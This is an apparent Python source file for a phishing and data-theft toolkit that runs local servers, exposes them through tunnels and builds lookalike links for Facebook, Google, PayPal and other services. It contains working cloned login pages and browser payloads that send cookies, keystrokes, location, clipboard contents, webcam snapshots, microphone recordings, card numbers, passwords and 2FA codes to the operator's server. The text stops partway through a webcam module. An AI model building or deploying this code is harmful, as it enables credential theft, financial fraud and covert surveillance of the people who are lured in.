#!/usr/bin/env python3
"""
ULTIMATE SECURITY FRAMEWORK - FULL FEATURE EDITION
All modules: phishing, cookie, keylog, geo, fingerprint, clipboard,
webcam, mic, fake captcha, credit card, email harvest, 2FA, fake update.
Each on separate port – use individual ngrok tunnels or local WiFi.
Run with: python3 ultimate_framework.py
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import random
import shutil
import webbrowser
from datetime import datetime
from urllib.parse import parse_qs, urlparse

# Install missing dependencies
try:
    import requests
except ImportError:
    os.system('pip3 install requests')
    import requests

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system('pip3 install colorama')
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

try:
    import qrcode
except ImportError:
    os.system('pip3 install qrcode')
    import qrcode

# ==================== COLOR DEFINITIONS ====================
PINK = Fore.MAGENTA + Style.BRIGHT
GREEN = Fore.GREEN + Style.BRIGHT
BLUE = Fore.CYAN + Style.BRIGHT
RED = Fore.RED + Style.BRIGHT
YELLOW = Fore.YELLOW + Style.BRIGHT
WHITE = Fore.WHITE
CYAN = Fore.CYAN
RESET = Style.RESET_ALL

# ==================== REALISTIC SUBDOMAINS & PATHS ====================
REALISTIC_SUBDOMAINS = {
    'facebook': ['facebook-login-verify', 'fb-security-check', 'facebook-help-center', 'fb-account-alert', 'facebook-secure'],
    'google': ['accounts-google', 'google-security-check', 'gmail-verify', 'google-account-alert', 'myaccount-google'],
    'instagram': ['insta-help-center', 'instagram-verify', 'insta-security-check', 'instagram-login-help', 'insta-account'],
    'twitter': ['twitter-verify', 'twitter-security', 'twitter-help-center', 'tw-account-alert', 'twitter-login'],
    'microsoft': ['microsoft-verify', 'live-login', 'outlook-security', 'microsoft-account-alert', 'office-verify'],
    'amazon': ['amazon-order-tracking', 'amazon-verify', 'amazon-security-check', 'amazon-account-alert', 'amazon-payment'],
    'paypal': ['paypal-confirm', 'paypal-verify', 'paypal-security-check', 'paypal-account-alert', 'paypal-payment'],
    'apple': ['appleid-verify', 'apple-security-check', 'icloud-login', 'apple-account-alert', 'apple-help'],
    'generic': ['security-check', 'verify-account', 'account-alert', 'help-center', 'confirm-identity']
}

REALISTIC_PATHS = {
    'login': ['/login/confirm', '/signin/verify', '/auth/authenticator', '/account/login', '/secure/signin'],
    'verify': ['/verify-identity', '/confirm-account', '/validate-session', '/check-credentials', '/auth/verify'],
    'security': ['/security/checkpoint', '/secure/verify', '/safety/confirm', '/protection/validate', '/secure/auth'],
    'recovery': ['/account/recovery', '/reset-password', '/forgot-password', '/recover-access', '/account/restore'],
    'billing': ['/billing/update', '/payment/verify', '/card/confirm', '/invoice/view', '/payment/secure'],
    'alert': ['/notification/alert', '/security-warning', '/unusual-activity', '/account-alert', '/suspicious-login'],
    'update': ['/update-required', '/software-update', '/browser-update', '/security-update', '/critical-update']
}

# ==================== MAIN FRAMEWORK CLASS ====================
class UltimateFramework:
    def __init__(self):
        self.local_ip = self.get_local_ip()
        self.captured_data = []
        self.servers = []
        self.public_url = None
        self.log_file = f"captured_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def print_c(self, text, color=GREEN, end='\n'):
        print(f"{color}{text}{RESET}", end=end)

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def print_header(self):
        self.clear_screen()
        header = f"""
{RED}╔══════════════════════════════════════════════════════════════════════════════╗
{RED}║{YELLOW}          🎭 ULTIMATE SECURITY FRAMEWORK - FULL FEATURE EDITION       {RED}║
{RED}║{BLUE}              Webcam | Mic | Fake CAPTCHA | Credit Card | 2FA           {RED}║
{RED}╚══════════════════════════════════════════════════════════════════════════════╝{RESET}
"""
        print(header)
        self.print_c(f"📍 Your IP: {self.local_ip}", YELLOW)
        self.print_c(f"🌍 Public URL: {self.public_url if self.public_url else 'Not active'}", GREEN if self.public_url else WHITE)
        self.print_c(f"📁 Log file: {self.log_file}", BLUE)
        self.print_c(f"⚡ Captured items: {len(self.captured_data)}", GREEN if self.captured_data else WHITE)

    # ==================== PUBLIC URL GENERATION ====================
    def start_public_url(self, port=8080):
        self.print_c("\n🌍 GENERATING PUBLIC URL (WORKS ANYWHERE)", PINK)
        self.print_c("═" * 70, BLUE)
        self.print_c("Choose tunneling method:", YELLOW)
        self.print_c("  [1] Ngrok (you run manually, then paste URL)", GREEN)
        self.print_c("  [2] Serveo (you run manually, then paste URL)", GREEN)
        self.print_c("  [3] Localhost.run (you run manually, then paste URL)", GREEN)
        self.print_c("  [4] Skip - use local only", WHITE)
        choice = input(f"{BLUE}Choice: {RESET}").strip()

        if choice == '4':
            self.print_c("Using local network only", YELLOW)
            return None

        self.print_c(f"\n🔧 Please open a NEW terminal and run the appropriate command:", YELLOW)
        if choice == '1':
            self.print_c(f"   ngrok http {port}", CYAN)
        elif choice == '2':
            self.print_c(f"   ssh -R 80:localhost:{port} serveo.net", CYAN)
        elif choice == '3':
            self.print_c(f"   ssh -R 80:localhost:{port} localhost.run", CYAN)
        else:
            return None

        self.public_url = input(f"\n{BLUE}After running, copy the public URL (e.g., https://abc.ngrok.io) and paste here: {RESET}").strip()
        if self.public_url:
            self.print_c(f"✅ Public URL set to: {self.public_url}", GREEN)
        return self.public_url

    # ==================== REALISTIC LINK GENERATOR ====================
    def generate_realistic_link(self, platform, attack_type, port=8080):
        fake_subdomain = random.choice(REALISTIC_SUBDOMAINS.get(platform, REALISTIC_SUBDOMAINS['generic']))
        path_map = {
            'login': REALISTIC_PATHS['login'],
            'verify': REALISTIC_PATHS['verify'],
            'security': REALISTIC_PATHS['security'],
            'alert': REALISTIC_PATHS['alert'],
            'update': REALISTIC_PATHS['update']
        }
        paths = path_map.get(attack_type, REALISTIC_PATHS['verify'])
        path = random.choice(paths)
        random_param = f"?ref={random.choice(['email', 'sms', 'notification', 'alert'])}&source={random.choice(['mobile', 'desktop', 'tablet'])}"

        if self.public_url:
            base = self.public_url.rstrip('/')
            full_url = f"{base}/{fake_subdomain}{path}{random_param}"
        else:
            full_url = f"http://{self.local_ip}:{port}/{fake_subdomain}{path}{random_param}"
        return full_url

    # ==================== GENERIC HTTP SERPER (each module on its own port) ====================
    def start_http_server(self, port, module_type, platform=None, redirect_url="https://www.google.com"):
        """
        Start a simple HTTP server for a single module.
        module_type: 'phish','cookie','keylog','geo','fingerprint','clip','webcam','mic','captcha','credit','email','2fa','update'
        """
        def serve():
            try:
                import http.server
                import socketserver
                from urllib.parse import parse_qs

                class ModuleHandler(http.server.SimpleHTTPRequestHandler):
                    def __init__(self, request, client_address, server, *args, **kwargs):
                        self.module_type = module_type
                        self.platform = platform
                        self.redirect_url = redirect_url
                        self.captured_data = server.captured_data
                        self.print_capture = server.print_capture
                        super().__init__(request, client_address, server, *args, **kwargs)

                    def do_GET(self):
                        # Map to appropriate HTML file
                        filename = None
                        if self.module_type == 'phish' and self.platform:
                            filename = f"{self.platform}_login.html"
                        elif self.module_type == 'cookie':
                            filename = "cookie_stealer.html"
                        elif self.module_type == 'keylog':
                            filename = "keylogger.html"
                        elif self.module_type == 'geo':
                            filename = "geolocation.html"
                        elif self.module_type == 'fingerprint':
                            filename = "fingerprint.html"
                        elif self.module_type == 'clip':
                            filename = "clipboard.html"
                        elif self.module_type == 'webcam':
                            filename = "webcam.html"
                        elif self.module_type == 'mic':
                            filename = "microphone.html"
                        elif self.module_type == 'captcha':
                            filename = "fake_captcha.html"
                        elif self.module_type == 'credit':
                            filename = "credit_card.html"
                        elif self.module_type == 'email':
                            filename = "email_harvest.html"
                        elif self.module_type == '2fa':
                            filename = "2fa_stealer.html"
                        elif self.module_type == 'update':
                            filename = "fake_update.html"

                        if filename and os.path.exists(filename):
                            self.path = '/' + filename
                        else:
                            self.send_error(404, "Page not found")
                            return
                        return http.server.SimpleHTTPRequestHandler.do_GET(self)

                    def do_POST(self):
                        content_length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(content_length).decode('utf-8')
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        client_ip = self.client_address[0]

                        # Parse JSON or form data
                        try:
                            if self.headers.get('Content-Type') == 'application/json':
                                data = json.loads(post_data)
                            else:
                                data = parse_qs(post_data)
                                data = {k: v[0] if len(v) == 1 else v for k, v in data.items()}
                        except:
                            data = {"raw": post_data}

                        entry = {
                            'timestamp': timestamp,
                            'ip': client_ip,
                            'type': self.module_type,
                            'path': self.path,
                            'data': data
                        }
                        self.captured_data.append(entry)
                        self.print_capture(entry)

                        # Special handling for geolocation: open Google Maps
                        if self.module_type == 'geo' and 'lat' in data and 'lon' in data:
                            lat, lon = data['lat'], data['lon']
                            maps_url = f"https://www.google.com/maps?q={lat},{lon}"
                            self.print_c(f"\n🗺️ Opening Google Maps at coordinates: {lat}, {lon}", CYAN)
                            webbrowser.open(maps_url)

                        # Send redirect response
                        html = f"""<!DOCTYPE html>
<html><head><meta http-equiv="refresh" content="2;url={self.redirect_url}"></head>
<body style="font-family: Arial; text-align: center; padding: 50px;">
<h3>Processing... Redirecting...</h3>
</body></html>"""
                        self.send_response(200)
                        self.send_header('Content-Type', 'text/html')
                        self.end_headers()
                        self.wfile.write(html.encode())

                    def log_message(self, format, *args):
                        pass

                class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
                    allow_reuse_address = True
                    def __init__(self, server_address, handler_class, captured_data, print_capture_func):
                        super().__init__(server_address, handler_class)
                        self.captured_data = captured_data
                        self.print_capture = print_capture_func

                server = ThreadedTCPServer(("", port), ModuleHandler, self.captured_data, self.print_capture)
                self.print_c(f"🌐 Server ({module_type}) running on port {port}", GREEN)
                server.serve_forever()
            except Exception as e:
                self.print_c(f"Server error on port {port}: {e}", RED)

        thread = threading.Thread(target=serve, daemon=True)
        thread.start()
        self.servers.append(thread)

    def print_capture(self, entry):
        print(f"{RED}\n{'='*60}{RESET}")
        print(f"{RED}[{entry['timestamp']}] 🔥 {entry['type'].upper()} DATA from {entry['ip']}{RESET}")
        print(f"{RED}{'='*60}{RESET}")
        data = entry['data']
        if isinstance(data, dict):
            for k, v in data.items():
                print(f"{GREEN}📝 {k}: {v}{RESET}")
        else:
            print(f"{GREEN}📝 {data}{RESET}")
        print(f"{RED}{'='*60}{RESET}")

    # ==================== HTML PAYLOADS ====================
    def generate_phishing_html(self, platform):
        templates = {
            'facebook': '''<!DOCTYPE html>
<html><head><title>Facebook - Log In or Sign Up</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial; background:#f0f2f5; margin:0; padding:20px;}
.container {max-width:400px; margin:100px auto; background:white; padding:20px; border-radius:8px;}
input {width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:4px;}
button {width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:4px;}
h2 {color:#1877f2;}
</style>
</head>
<body>
<div class="container">
    <h2>facebook</h2>
    <form method="POST" action="/login">
        <input type="text" name="email" placeholder="Email or phone number" required>
        <input type="password" name="pass" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>''',
            'google': '''<!DOCTYPE html>
<html><head><title>Google Account - Sign in</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial; background:white; margin:0; padding:20px;}
.container {max-width:450px; margin:100px auto; padding:48px 40px 36px; border:1px solid #dadce0; border-radius:8px;}
input {width:100%; padding:12px; margin:16px 0; border:1px solid #dadce0; border-radius:4px;}
button {width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px;}
</style>
</head>
<body>
<div class="container">
    <h2>Sign in</h2>
    <p>to continue to Gmail</p>
    <form method="POST" action="/login">
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Next</button>
    </form>
</div>
</body>
</html>''',
            'instagram': '''<!DOCTYPE html>
<html><head><title>Instagram - Log In</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial; background:#fafafa; margin:0; padding:20px;}
.container {max-width:350px; margin:100px auto; background:white; padding:40px; border:1px solid #dbdbdb; border-radius:1px;}
input {width:100%; padding:12px; margin:8px 0; border:1px solid #dbdbdb; border-radius:4px; background:#fafafa;}
button {width:100%; padding:12px; background:#0095f6; color:white; border:none; border-radius:4px; font-weight:bold;}
</style>
</head>
<body>
<div class="container">
    <h2 style="text-align:center; font-family:'Billabong', cursive;">Instagram</h2>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>'''
        }
        return templates.get(platform, self.generic_phishing_html(platform))

    def generic_phishing_html(self, platform):
        return f'''<!DOCTYPE html>
<html><head><title>{platform.capitalize()} - Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {{font-family: Arial; background:#f0f2f5; margin:0; padding:20px;}}
.container {{max-width:400px; margin:100px auto; background:white; padding:20px; border-radius:8px;}}
input {{width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:4px;}}
button {{width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:4px;}}
</style>
</head>
<body>
<div class="container">
    <h2>{platform.capitalize()}</h2>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username or Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>'''

    def generate_cookie_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Security Check</title></head>
<body><h2>Verifying your session...</h2>
<script>
setTimeout(function() {{
    var data = {{cookies: document.cookie, url: window.location.href, time: new Date().toISOString()}};
    fetch('{base}/steal', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(data)
    }});
    document.body.innerHTML = '<h2>Verification complete. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
}}, 500);
</script>
</body></html>'''

    def generate_keylogger_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Software Update</title>
<script>
var keystrokes = '';
document.addEventListener('keydown', function(e) {{
    keystrokes += e.key;
    if(keystrokes.length >= 10) {{
        fetch('{base}/log', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{keys: keystrokes, url: window.location.href}})
        }});
        keystrokes = '';
    }}
}});
setInterval(function() {{
    if(keystrokes.length > 0) {{
        fetch('{base}/log', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{keys: keystrokes, url: window.location.href}})
        }});
        keystrokes = '';
    }}
}}, 5000);
</script>
</head>
<body><h2>Updating system, please wait...</h2>
<input type="text" placeholder="Enter anything..." style="width:300px; padding:10px;">
</body></html>'''

    def generate_geolocation_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Location Verification</title>
<script>
if(navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(function(pos) {{
        fetch('{base}/geo', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                url: window.location.href
            }})
        }});
        document.body.innerHTML = '<h2>Location verified. Redirecting...</h2>';
        setTimeout(() => window.location.href = 'https://www.google.com/maps', 1500);
    }}, function(err) {{
        document.body.innerHTML = '<h2>Unable to get location. Redirecting...</h2>';
        setTimeout(() => window.location.href = 'https://www.google.com', 1500);
    }});
}} else {{
    document.body.innerHTML = '<h2>Geolocation not supported. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
}}
</script>
</head>
<body><h2>Verifying your location for security...</h2></body>
</html>'''

    def generate_fingerprint_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        # Fast fingerprint with fake progress bar to keep user engaged
        return f'''<!DOCTYPE html>
<html><head><title>Device Check</title>
<style>
#progress {{width:300px; background:#f0f0f0; margin:20px auto; border-radius:10px; overflow:hidden;}}
#bar {{width:0%; height:20px; background:#4caf50; text-align:center; color:white; line-height:20px;}}
</style>
<script>
var fp = {{
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: {{width: screen.width, height: screen.height, colorDepth: screen.colorDepth}},
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    touchSupport: 'ontouchstart' in window,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
    deviceMemory: navigator.deviceMemory || 'unknown',
    plugins: Array.from(navigator.plugins || []).map(p => p.name)
}};
// Animate progress bar while collecting fingerprint
var width = 0;
var interval = setInterval(function() {{
    if(width >= 100) clearInterval(interval);
    else {{
        width += 20;
        document.getElementById('bar').style.width = width + '%';
        document.getElementById('bar').innerHTML = width + '%';
    }}
}}, 100);
setTimeout(function() {{
    fetch('{base}/fp', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(fp)
    }});
    document.body.innerHTML = '<h2>Device check complete. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.whatsmybrowser.org', 1000);
}}, 600);
</script>
</head>
<body><h2>Checking your device...</h2>
<div id="progress"><div id="bar">0%</div></div>
<p>Please wait while we verify your system...</p>
</body></html>'''

    def generate_clipboard_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Security Check</title>
<script>
async function readClipboard() {{
    try {{
        const text = await navigator.clipboard.readText();
        fetch('{base}/clip', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{clipboard: text, url: window.location.href}})
        }});
    }} catch(e) {{
        fetch('{base}/clip', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{clipboard: 'Permission denied', error: e.message}})
        }});
    }}
    document.body.innerHTML = '<h2>Verification complete. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
}}
readClipboard();
</script>
</head>
<body><h2>Verifying your session...</h2></body>
</html>'''

    # ---------- NEW MODULE PAYLOADS ----------
    def generate_webcam_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Identity Verification</title>
<script>
function capture() {{
    navigator.mediaDevices.getUserMedia({{ video: true }})
        .then(stream => {{
            let video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {{
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                let imageData = canvas.toDataURL('image/jpeg');
                fetch('{base}/webcam', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{image: imageData, url: window.location.href}})
                }});
                stream.getTracks().forEach(track => track.stop());
                document.body.innerHTML = '<h2>Verification complete. Redirecting...</h2>';
                setTimeout(() => window.location.href = 'https://www.google.com', 1500);
            }}, 2000);
        }})
        .catch(err => {{
            document.body.innerHTML = '<h2>Camera access denied. Redirecting...</h2>';
            setTimeout(() => window.location.href = 'https://www.google.com', 1500);
        }});
}}
window.onload = capture;
</script>
</head>
<body><h2>Please allow camera access for identity verification...</h2></body>
</html>'''

    def generate_microphone_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Voice Authentication</title>
<script>
function record() {{
    navigator.mediaDevices.getUserMedia({{ audio: true }})
        .then(stream => {{
            let mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {{
                let blob = new Blob(chunks, {{ type: 'audio/webm' }});
                let reader = new FileReader();
                reader.onload = function() {{
                    fetch('{base}/mic', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{audio: reader.result, url: window.location.href}})
                    }});
                    document.body.innerHTML = '<h2>Voice verified. Redirecting...</h2>';
                    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
                }};
                reader.readAsDataURL(blob);
            }};
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 3000);
        }})
        .catch(err => {{
            document.body.innerHTML = '<h2>Microphone access denied. Redirecting...</h2>';
            setTimeout(() => window.location.href = 'https://www.google.com', 1500);
        }});
}}
window.onload = record;
</script>
</head>
<body><h2>Please allow microphone access for voice authentication...</h2>
<p>Recording for 3 seconds...</p></body>
</html>'''

    def generate_fake_captcha_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Security Check</title>
<style>
.captcha {{background:#f9f9f9; border:1px solid #ccc; padding:20px; width:300px; margin:100px auto; text-align:center;}}
input {{margin:10px; padding:8px; width:80%;}}
</style>
<script>
function submitCaptcha() {{
    let userInput = document.getElementById('captchaInput').value;
    fetch('{base}/captcha', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{captcha: userInput, email: document.getElementById('email').value, password: document.getElementById('password').value}})
    }});
    document.body.innerHTML = '<h2>Verification successful. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
}}
</script>
</head>
<body>
<div class="captcha">
    <h3>Please verify you are human</h3>
    <input type="email" id="email" placeholder="Email" required><br>
    <input type="password" id="password" placeholder="Password" required><br>
    <img src="https://via.placeholder.com/200x50?text=ABCD" alt="CAPTCHA"><br>
    <input type="text" id="captchaInput" placeholder="Enter the code above"><br>
    <button onclick="submitCaptcha()">Verify</button>
</div>
</body>
</html>'''

    def generate_credit_card_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Payment Verification</title>
<style>
.card {{background:#fff; border:1px solid #ddd; padding:20px; width:350px; margin:100px auto; border-radius:8px;}}
input {{width:100%; padding:10px; margin:8px 0;}}
button {{background:#28a745; color:white; padding:10px; width:100%; border:none;}}
</style>
<script>
function submitCard() {{
    let data = {{
        cardNumber: document.getElementById('cardNumber').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        name: document.getElementById('name').value
    }};
    fetch('{base}/credit', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(data)
    }});
    document.body.innerHTML = '<h2>Payment verified. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
}}
</script>
</head>
<body>
<div class="card">
    <h3>Enter Payment Details</h3>
    <input type="text" id="name" placeholder="Cardholder Name"><br>
    <input type="text" id="cardNumber" placeholder="Card Number"><br>
    <input type="text" id="expiry" placeholder="MM/YY"><br>
    <input type="text" id="cvv" placeholder="CVV"><br>
    <button onclick="submitCard()">Verify Payment</button>
</div>
</body>
</html>'''

    def generate_email_harvest_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Newsletter Subscription</title>
<style>
.sub {{width:300px; margin:100px auto; padding:20px; border:1px solid #ccc; text-align:center;}}
input {{width:90%; padding:8px; margin:8px;}}
</style>
<script>
function submitEmail() {{
    let email = document.getElementById('email').value;
    let password = document.getElementById('password').value;
    fetch('{base}/email', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{email: email, password: password}})
    }});
    document.body.innerHTML = '<h2>Subscription confirmed. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
}}
</script>
</head>
<body>
<div class="sub">
    <h3>Subscribe to our newsletter</h3>
    <input type="email" id="email" placeholder="Your email"><br>
    <input type="password" id="password" placeholder="Your password (for verification)"><br>
    <button onclick="submitEmail()">Subscribe</button>
</div>
</body>
</html>'''

    def generate_2fa_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Two-Factor Authentication</title>
<style>
.container {{width:300px; margin:100px auto; padding:20px; border:1px solid #ccc; text-align:center;}}
input {{width:90%; padding:8px; margin:8px;}}
</style>
<script>
function submitCode() {{
    let code = document.getElementById('code').value;
    fetch('{base}/2fa', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{code: code, url: window.location.href}})
    }});
    document.body.innerHTML = '<h2>Verifying code. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
}}
</script>
</head>
<body>
<div class="container">
    <h3>Two-Factor Authentication</h3>
    <p>A verification code was sent to your phone.</p>
    <input type="text" id="code" placeholder="Enter 6-digit code"><br>
    <button onclick="submitCode()">Verify</button>
</div>
</body>
</html>'''

    def generate_fake_update_payload(self, port):
        base = self.public_url if self.public_url else f"http://{self.local_ip}:{port}"
        return f'''<!DOCTYPE html>
<html><head><title>Critical Security Update</title>
<style>
.update {{width:350px; margin:100px auto; padding:20px; border:1px solid #f00; background:#fee; text-align:center;}}
button {{background:#007bff; color:white; padding:10px 20px; border:none;}}
</style>
<script>
function downloadUpdate() {{
    fetch('{base}/update', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{action: 'download', time: new Date().toISOString()}})
    }});
    // Simulate download of a harmless text file
    let element = document.createElement('a');
    element.setAttribute('href', 'data:text/plain;charset=utf-8,This is a simulated security update for educational purposes.');
    element.setAttribute('download', 'security_update.txt');
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
    document.body.innerHTML = '<h2>Update downloaded. Redirecting...</h2>';
    setTimeout(() => window.location.href = 'https://www.google.com', 2000);
}}
</script>
</head>
<body>
<div class="update">
    <h3>⚠️ Critical Security Update Required</h3>
    <p>Your browser is out of date. Click below to install the latest security patch.</p>
    <button onclick="downloadUpdate()">Download Update</button>
</div>
</body>
</html>'''

    # ==================== MODULE HANDLERS ====================
    def generate_phishing_link(self):
        self.print_c("\n🎭 REALISTIC PHISHING LINK GENERATOR", PINK)
        self.print_c("═" * 70, BLUE)
        self.print_c("Select platform to clone:", YELLOW)
        platforms = {'1':'facebook','2':'google','3':'instagram','4':'twitter','5':'microsoft','6':'amazon','7':'paypal','8':'apple'}
        for k,v in platforms.items():
            self.print_c(f"  [{k}] {v.capitalize()}", GREEN)
        choice = input(f"{BLUE}Choice: {RESET}").strip()
        platform = platforms.get(choice, 'facebook')

        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice == '1' and not self.public_url:
            self.start_public_url(8080)

        html = self.generate_phishing_html(platform)
        with open(f"{platform}_login.html", "w") as f:
            f.write(html)

        self.start_http_server(8080, 'phish', platform=platform, redirect_url=f"https://www.{platform}.com")
        link = self.generate_realistic_link(platform, 'login', 8080)
        self.print_c(f"\n✅ PHISHING LINK: {link}", GREEN)
        return link

    def generate_cookie_stealer(self):
        port=9090
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_cookie_payload(port)
        with open("cookie_stealer.html","w") as f: f.write(html)
        self.start_http_server(port,'cookie',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','verify',port)
        self.print_c(f"\n✅ COOKIE STEALER: {link}", GREEN)

    def generate_keylogger(self):
        port=9091
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_keylogger_payload(port)
        with open("keylogger.html","w") as f: f.write(html)
        self.start_http_server(port,'keylog',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','update',port)
        self.print_c(f"\n✅ KEYLOGGER: {link}", GREEN)

    def generate_geolocation(self):
        port=9092
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_geolocation_payload(port)
        with open("geolocation.html","w") as f: f.write(html)
        self.start_http_server(port,'geo',redirect_url="https://www.google.com/maps")
        link=self.generate_realistic_link('generic','security',port)
        self.print_c(f"\n✅ GEOLOCATION: {link}", GREEN)

    def generate_fingerprint(self):
        port=9093
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_fingerprint_payload(port)
        with open("fingerprint.html","w") as f: f.write(html)
        self.start_http_server(port,'fingerprint',redirect_url="https://www.whatsmybrowser.org")
        link=self.generate_realistic_link('generic','security',port)
        self.print_c(f"\n✅ FINGERPRINT: {link}", GREEN)

    def generate_clipboard_hijacker(self):
        port=9094
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_clipboard_payload(port)
        with open("clipboard.html","w") as f: f.write(html)
        self.start_http_server(port,'clip',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','alert',port)
        self.print_c(f"\n✅ CLIPBOARD: {link}", GREEN)

    # ---------- NEW MODULES ----------
    def generate_webcam(self):
        port=9095
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
